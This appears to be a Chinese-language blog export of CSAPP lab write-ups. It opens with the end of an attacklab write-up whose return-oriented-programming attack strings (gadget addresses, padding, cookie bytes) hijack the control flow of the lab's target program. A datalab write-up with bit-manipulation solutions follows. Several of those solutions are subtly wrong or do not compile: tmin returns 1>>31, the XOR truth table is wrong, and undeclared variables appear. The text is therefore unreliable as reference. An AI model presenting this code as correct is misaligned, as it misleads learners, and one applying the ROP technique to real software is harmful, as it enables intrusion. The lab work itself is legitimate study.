<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//前0x28个字符填充0x00</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//popq %rax </span></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//cookie （popq的目标）</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//movq %rax,%rdi</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//返回到 touch2 retq</span></span><br></pre></td></tr></table></figure>
<h2 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h2><p>我们接下来的思路为：</p>
<ol>
<li>获得 %rsp 的地址</li>
<li>将（栈的起始地址）+（cookie 的偏移量）放入某个寄存器中</li>
<li>将寄存器的值放入 %rdi 中</li>
<li>调用 touch3</li>
</ol>
<p>首先，寻找 movq %rsp, %rax, 48 89 e0<br>在以下字节序列中可以找到：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000401</span>aab &lt;setval_350&gt;:</span><br><span class="line">  <span class="number">401</span>aab:   c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> e0 <span class="number">90</span>       movl   $<span class="number">0x90e08948</span>,(%rdi)</span><br><span class="line">  <span class="number">401</span>ab1:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>gadget_farm中的一个函数<mark class="label default">add_xy</mark>可实现地址偏移。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004019</span>d6 &lt;add_xy&gt;: </span><br><span class="line">  <span class="number">4019</span>d6:	<span class="number">48</span> <span class="number">8</span>d <span class="number">04</span> <span class="number">37</span>          	lea    (%rdi,%rsi,<span class="number">1</span>),%rax</span><br><span class="line">  <span class="number">4019</span>da:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>接下来要将 %rax 的内容移动到 %rdi 中，找到 <code>mov %rax, %rdi</code>, 即字节码为<code>48 89 c7</code> 的代码片段：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000004019</span>a0 &lt;addval_273&gt;:</span><br><span class="line">  <span class="number">4019</span>a0:   <span class="number">8</span>d <span class="number">87</span> <span class="number">48</span> <span class="number">89</span> c7 c3       lea    <span class="number">-0x3c3876b8</span>(%rdi),%eax</span><br><span class="line">  <span class="number">4019</span>a6:   c3                      retq</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>cookie的偏移位置为<code>55(0x37)-3*8=31</code><br>构造攻击字符串如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ad <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//movq %rsp, %rax</span></span><br><span class="line">d8 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//add_xy</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//mov %rax, %rdi,</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">35</span> <span class="comment">//cookie</span></span><br><span class="line"><span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>datalab</title>
    <url>/systems/datalab/</url>
    <content><![CDATA[<p>计算机中的数以二进制的形式存储和运算，每个比特不是0就是1。计算机通过对比特进行不同方式的编码和描述，从而执行纷繁复杂的各种任务。我们有诸多基于底层的接口，所以一般不会直接接触到比特的运算。datalab直接与编码数字序列的0和1打交道，通过对整数和浮点数的位操作来实现一系列的操作。</p>
<a id="more"></a>

<h1 id="整数运算"><a href="#整数运算" class="headerlink" title="整数运算"></a>整数运算</h1><h2 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h2><blockquote>
<p>x^y using only ~ and &amp;<br>Example: bitXor(4, 5) = 1<br> Legal ops: ~ &amp;<br> Max ops: 14<br> Rating: 1</p>
</blockquote>
<p>假设a,b均为由单个二进制位表示的数<br>则a,b,a^b对应真值表如下<br>a^b在a,b中只有一个取1时取1</p>
<table>
<thead>
<tr>
<th align="center">a</th>
<th align="center">b</th>
<th align="center">a^b</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">1</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">0</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">1</td>
</tr>
</tbody></table>
<p>(<del>a&amp;b)|(</del>b&amp;a)<br>a取0，b取1时为1，<br>b取0，a取1时为1，<br><del>((</del>a&amp;b)|(<del>b&amp;a))即为结果<br>但是只能用</del>和&amp;，化简得(<del>((</del>a)&amp;b))&amp;(<del>((</del>b)&amp;a))</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (~((~x)&amp;y))&amp;(~((~y)&amp;x));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h2><blockquote>
<p>return minimum two’s complement integer<br>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br> Max ops: 4<br> Rating: 1</p>
</blockquote>
<p>32位时补码可以表示最大整数为1&gt;&gt;31</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span>&gt;&gt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h2><blockquote>
<p>returns 1 if x is the maximum, two’s complement number,and 0 otherwise<br>Legal ops: ! ~ &amp; ^ | +<br> Max ops: 10<br> Rating: 1</p>
</blockquote>
<p>2(Tmax+1)会溢出为0，符合2*num等于0的数只有0x0和0x10000000<br>再排除0即可<br>!(x+1+x+1)&amp;!(x+1)<br>调试时报错，不可以使用0xff和0x0以外的常数，由0xff和0x0变换得到0x1<br>0xff+0xff=0x1fe<br>0x1fe&amp;0xff=0xfe<br>0xfe^0xff=0x1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以下的tmp即为0x1;</span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">   tmp=((<span class="number">0xff</span>+<span class="number">0xff</span>)&amp;<span class="number">0xff</span>)^<span class="number">0xff</span>;</span><br><span class="line">  <span class="keyword">return</span> !(x+tmp+x+tmp)&amp;!(x+tmp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h2><blockquote>
<p>return 1 if all odd-numbered bits in word set to 1<br>where bits are numbered from 0 (least significant) to 31 (most significant)<br> Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1<br> Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br> Max ops: 12<br> Rating: 2</p>
</blockquote>
<p>奇数位全为0，偶数位全为1的32位二进制数的十六进制表示为0xaaaaaaaa<br>若x满足奇数位全为1，则取反后奇数位全为0<br>则x&amp;0xaaaaaaaa所有位均为0</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !(~x&amp;<span class="number">0xaaaaaaaa</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a><strong>negate</strong></h2><blockquote>
<p>return -x<br>Example: negate(1) = -1.<br> Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br> Max ops: 5<br> Rating: 2</p>
</blockquote>
<p>一个数的相反数的补码表示为该数的反码再加一</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">x+~x=<span class="number">0xffffffff</span>=<span class="number">-1</span></span><br><span class="line">x+~x+<span class="number">1</span>=<span class="number">0</span></span><br><span class="line"><span class="keyword">int</span> negate(<span class="keyword">int</span> x) &#123;</span><br><span class="line">  <span class="keyword">return</span> (~x+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h2><blockquote>
<p>return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters ‘0’ to ‘9’)<br>Example: isAsciiDigit(0x35) = 1.<br>isAsciiDigit(0x3a) = 0.<br>  isAsciiDigit(0x05) = 0.<br> Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br> Max ops: 15<br> Rating: 3</p>
</blockquote>
<p>判断x在0x30到0x39<br>x-0x30的符号位为0<br>x-0x3a的符号位为1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (!((x+(~(<span class="number">0x30</span>)+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>))&amp;((x+(~(<span class="number">0x3A</span>)+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h2><blockquote>
<p>same as x ? y : z<br>Example: conditional(2,4,5) = 4<br> Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br> Max ops: 16<br> Rating: 3</p>
</blockquote>
<p>0xffffffff&amp;a=a,0x00000000&amp;b=0x00000000<br>当x=1时，得到0xffffffff(0),当x=0时，得到0x00000000(1)<br>思路一：!x-1 也即!x+~1+1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  cond=!x+~<span class="number">1</span>+<span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> (mask&amp;y)|((~mask&amp;z);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> conditional(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z) &#123;</span><br><span class="line">  <span class="keyword">return</span> ((!x+~<span class="number">1</span>+<span class="number">1</span>)&amp;y)|((~!x+<span class="number">1</span>)&amp;z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>思路二：位移</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  mask=(x&gt;&gt;<span class="number">31</span>)&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> (mask&amp;y)|(~mask&amp;z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h2><blockquote>
<p>if x &lt;= y  then return 1, else return 0<br>Example: isLessOrEqual(4,5) = 1.<br> Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br> Max ops: 24<br> Rating: 3</p>
</blockquote>
<ol>
<li>在x与y同号的情况下转换为p=y-x&gt;=0，然后p符号位(p&gt;&gt;31）&amp;1为0则返回1，符号位1则返回0；</li>
<li>异号时，只要x&gt;=0，就要返回0，否则返回1，由(x&gt;&gt;31)&amp;1判断；</li>
<li>c=a+b可作为x,y同号还是异号的判断。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a=x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> b=y&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> c=a^b;</span><br><span class="line">  <span class="keyword">int</span> p=y+(~x+<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">int</span> q=!((p&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">int</span> ans=(c&amp;q)|(!c&amp;a);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h2><blockquote>
<p>implement the ! operator, using all of the legal operators except !<br>Examples: logicalNeg(3) = 0, logicalNeg(0) = 1<br> Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br> Max ops: 12<br> Rating: 4 </p>
</blockquote>
<p>令y=~x+1，考虑x与y的符号位：</p>
<ol>
<li>当x=0x0时，x，y两者符号位都为0；</li>
<li>当x=0x8000 0000时，x，y两者符号位都为1；</li>
<li>否则，两者符号位为01或10；</li>
<li>根据离散数学的真值表得出(<del>x)&amp;(</del>y)，则当且仅当<code>x=0x0</code>时，其符号位为1</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((~(~x+<span class="number">1</span>)&amp;~x)&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h2><blockquote>
<p>return the minimum number of bits required to represent x in   two’s complement<br>Examples: howManyBits(12) = 5<br>         howManyBits(298) = 10<br>         howManyBits(-5) = 4<br>         howManyBits(0)  = 1<br>         howManyBits(-1) = 1<br>         howManyBits(0x80000000) = 32<br> Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br> Max ops: 90<br> Rating: 4</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> temp=x^(x&gt;&gt;<span class="number">31</span>);<span class="comment">//x小于0时取反码</span></span><br><span class="line">    <span class="keyword">int</span> isZero=!temp;</span><br><span class="line">    <span class="comment">//notZeroMask is 0xffffffff</span></span><br><span class="line">    <span class="keyword">int</span> notZeroMask=(!(!temp)&lt;&lt;<span class="number">31</span>)&gt;&gt;<span class="number">31</span>;</span><br><span class="line">    <span class="keyword">int</span> bit_16,bit_8,bit_4,bit_2,bit_1;</span><br><span class="line">    bit_16=!(!(temp&gt;&gt;<span class="number">16</span>))&lt;&lt;<span class="number">4</span>;</span><br><span class="line">    <span class="comment">//see if the high 16bits have value,if have,then we need at least 16 bits</span></span><br><span class="line">    <span class="comment">//if the highest 16 bits have value,then rightshift 16 to see the exact place of  </span></span><br><span class="line">    <span class="comment">//if not means they are all zero,right shift nothing and we should only consider the low 16 bits</span></span><br><span class="line">    temp=temp&gt;&gt;bit_16;</span><br><span class="line">    bit_8=!(!(temp&gt;&gt;<span class="number">8</span>))&lt;&lt;<span class="number">3</span>;</span><br><span class="line">    temp=temp&gt;&gt;bit_8;</span><br><span class="line">    bit_4=!(!(temp&gt;&gt;<span class="number">4</span>))&lt;&lt;<span class="number">2</span>;</span><br><span class="line">    temp=temp&gt;&gt;bit_4;</span><br><span class="line">    bit_2=!(!(temp&gt;&gt;<span class="number">2</span>))&lt;&lt;<span class="number">1</span>;</span><br><span class="line">    temp=temp&gt;&gt;bit_2;</span><br><span class="line">    bit_1=!(!(temp&gt;&gt;<span class="number">1</span>));</span><br><span class="line">    temp=bit_16+bit_8+bit_4+bit_2+bit_1+<span class="number">2</span>;<span class="comment">//at least we need one bit for 1 to tmax,</span></span><br><span class="line">    <span class="comment">//and we need another bit for sign</span></span><br><span class="line">    <span class="keyword">return</span> isZero|(temp&amp;notZeroMask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="浮点数运算"><a href="#浮点数运算" class="headerlink" title="浮点数运算"></a>浮点数运算</h1><h2 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h2><blockquote>
<p>Return bit-level equivalent of expression 2*f for<br>floating point argument f.<br>Both the argument and result are passed as unsigned int’s, but they are to be interpreted as the bit-level representation of<br> single-precision floating point values.<br> When argument is NaN, return argument<br> Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while<br> Max ops: 30<br> Rating: 4</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> s = uf&amp;<span class="number">0x80000000</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="built_in">exp</span> = uf&amp;<span class="number">0x7f800000</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> frac = uf&amp;<span class="number">0x007fffff</span>;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">exp</span>) &#123;</span><br><span class="line">		frac&lt;&lt;=<span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">exp</span>^<span class="number">0x7f800000</span>) &#123;</span><br><span class="line">		<span class="built_in">exp</span> += <span class="number">0x00800000</span>;</span><br><span class="line">		<span class="keyword">if</span>(!(<span class="built_in">exp</span>^<span class="number">0x7f800000</span>)) &#123;</span><br><span class="line">			frac = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s|<span class="built_in">exp</span>|frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h2><blockquote>
<p>Return bit-level equivalent of expression (int) f<br>for floating point argument f.<br> Argument is passed as unsigned int, but it is to be interpreted as the bit-level representation of a<br>single-precision floating point value.<br> Anything out of range (including NaN and infinity) should return 0x80000000u.<br>Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while<br> Max ops: 30<br> Rating: 4</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sign=(uf&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;<span class="comment">//取得符号位</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">exp</span>=uf&gt;&gt;<span class="number">23</span>&amp;<span class="number">0xff</span>;<span class="comment">//取得阶码</span></span><br><span class="line">  <span class="keyword">int</span> frac=uf&amp;<span class="number">0x7fffffff</span>;<span class="comment">//取得小数位</span></span><br><span class="line">  <span class="keyword">int</span> E=<span class="built_in">exp</span><span class="number">-127</span>;<span class="comment">//计算E</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">255</span>||E&gt;<span class="number">30</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>u;<span class="comment">//如果超出表示范围，返回0x80000000u</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">exp</span>||E&lt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//如果exp为0或偏移量小于0，均为不大于1的小数，E均等于1，则舍入到0</span></span><br><span class="line">  &#125;</span><br><span class="line">  frac=frac|(<span class="number">1</span>&lt;&lt;<span class="number">23</span>);<span class="comment">//frac=frac+1.0</span></span><br><span class="line">  <span class="comment">//小数点在23位处，根据E与23的相对位置调整小数点</span></span><br><span class="line">  <span class="keyword">if</span> (E&gt;<span class="number">23</span>)&#123;</span><br><span class="line">    frac=frac&lt;&lt;(E<span class="number">-23</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    frac=frac&gt;&gt;(<span class="number">23</span>-E);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (sign) &#123;</span><br><span class="line">    frac = ~(frac) + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="float-i2f"><a href="#float-i2f" class="headerlink" title="float_i2f"></a>float_i2f</h2><blockquote>
<p> Return bit-level equivalent of expression (float) x<br> Result is returned as unsigned int, but it is to be interpreted as the bit-levelrepresentation of a single-precision floating point values.<br> Legal ops: Any integer/unsigned operationsincl. ||, &amp;&amp;. also if, while<br> Max ops: 30<br> Rating: 4</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_i2f_2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> sign = x&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>; </span><br><span class="line">    <span class="keyword">int</span> i;  </span><br><span class="line">    <span class="keyword">int</span> exponent;   </span><br><span class="line">    <span class="keyword">int</span> fraction; </span><br><span class="line">    <span class="keyword">int</span> delta;  </span><br><span class="line">    <span class="keyword">int</span> fraction_mask;  </span><br><span class="line">    <span class="keyword">if</span>(x == <span class="number">0</span>)  </span><br><span class="line">        <span class="keyword">return</span> x;  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(x==<span class="number">0x80000000</span>)  </span><br><span class="line">        exponent=<span class="number">158</span>; <span class="comment">//x为Tmin(-2^31)时,exponent=31+127=158 </span></span><br><span class="line">    <span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span> (sign)  </span><br><span class="line">            x = -x;  </span><br><span class="line">        i = <span class="number">30</span>;  </span><br><span class="line">        <span class="keyword">while</span> ( !(x &gt;&gt; i) )  </span><br><span class="line">            i--;<span class="comment">//小数点偏移位数  </span></span><br><span class="line">        exponent = i + <span class="number">127</span>;</span><br><span class="line">        x = x &lt;&lt; (<span class="number">31</span> - i);  </span><br><span class="line">        fraction_mask = <span class="number">0x7fffff</span>;  </span><br><span class="line">        fraction = fraction_mask &amp; (x &gt;&gt; <span class="number">8</span>);<span class="comment">//32位数字舍弃低八位和首位的1得到23位的小数域</span></span><br><span class="line">		</span><br><span class="line">        x = x &amp; <span class="number">0xff</span>; <span class="comment">//舍入部分 </span></span><br><span class="line">        delta = x &gt; <span class="number">128</span> || ((x == <span class="number">128</span>) &amp;&amp; (fraction &amp; <span class="number">1</span>));<span class="comment">//向偶数舍入</span></span><br><span class="line">		</span><br><span class="line">        fraction += delta;  </span><br><span class="line">        <span class="keyword">if</span>(fraction &gt;&gt; <span class="number">23</span>) &#123;  </span><br><span class="line">            fraction &amp;= fraction_mask;<span class="comment">//处理溢出情况  </span></span><br><span class="line">            exponent += <span class="number">1</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> (sign&lt;&lt;<span class="number">31</span>)|(exponent&lt;&lt;<span class="number">23</span>)|fraction;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<h2 id="bitCount"><a href="#bitCount" class="headerlink" title="bitCount"></a>bitCount</h2><blockquote>
<p>returns count of number of 1’s in word<br>Examples: bitCount(5) = 2, bitCount(7) = 3<br>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br>Max ops: 40<br>Rating: 4</p>
</blockquote>
<p>分而治之，首先我们考虑两位的情况<br>例如二进制10,10&amp;01表明最低位是否为1，(x&gt;&gt;1)&amp;1,表明最低位的零位是否为1，<br>(x&amp;0x1)+(x&gt;&gt;1)&amp;0x1<br>计算每一位中1的个数并且相加</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitcount2</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bit1=<span class="number">0x1</span>;</span><br><span class="line">    <span class="keyword">return</span> x&amp;bit1+(x&gt;&gt;<span class="number">1</span>)&amp;bit1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来我们考虑四位的情况<br>例如1001，1001&amp;0101=0001,(1001&gt;&gt;1)&amp;0101=0001;<br>0001+0100=0101表示每两位均各有1个1，<br>将四位看作两段两位的二进制数，每段的1的个数由一个二位二进制数表示<br>0101&amp;0011=0001；(0101&gt;&gt;2)=0001,0001&amp;0011=0001;<br>计算每两位中1的个数并且相加<br>0001+0001=0010,即为最后的答案</p>
